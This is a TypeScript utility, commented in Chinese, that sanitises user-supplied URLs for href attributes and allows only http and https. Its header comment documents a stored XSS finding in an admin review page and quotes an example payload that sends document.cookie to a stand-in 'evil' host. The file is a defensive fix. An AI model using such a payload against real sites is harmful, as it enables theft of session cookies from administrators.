/**
 * 把「使用者可控的字串」安全地變成 <a href> 可用的值。
 *
 * 2026-08-02 資安掃描：品牌申請表單的 `website` 欄位由**完全未認證**的公開端點
 * （`POST /platform/brand-applications`，無任何 Depends）收下，卻在後台直接渲染成
 * `<a href={app.website}>`。任何人都能送出
 * `javascript:fetch('https://evil/'+document.cookie)`，平台**最高權限** admin
 * 在審核畫面點下去就中 stored XSS。
 *
 * `rel="noopener noreferrer"` 擋不住這個——那是防 tabnabbing 的，與 scheme 無關。
 *
 * 後端已補上 `pattern=r"^https?://..."`，但**存量資料早於該驗證**，
 * 且「輸出點自己負責」是比較穩的假設，所以這裡是必要的第二層。
 */

/** 只有這兩個 scheme 可以進 href。其餘（javascript: / data: / vbscript: …）一律擋。 */
const ALLOWED_PROTOCOLS = new Set(["http:", "https:"]);

/**
 * @returns 安全的 URL 字串；不安全或無法解析時回 `null`（呼叫端應改為純文字顯示）。
 */
export function safeHref(raw: string | null | undefined): string | null {
  if (!raw) return null;

  // 用 URL 解析而非字串比對：`java\tscript:`、大小寫混合、前導空白等變形
  // 都會被 URL 正規化掉，比自己寫 startsWith 可靠。
  let parsed: URL;
  try {
    parsed = new URL(raw.trim());
  } catch {
    // 相對路徑或格式錯誤 → 不當作外部連結
    return null;
  }

  return ALLOWED_PROTOCOLS.has(parsed.protocol) ? parsed.toString() : null;
}
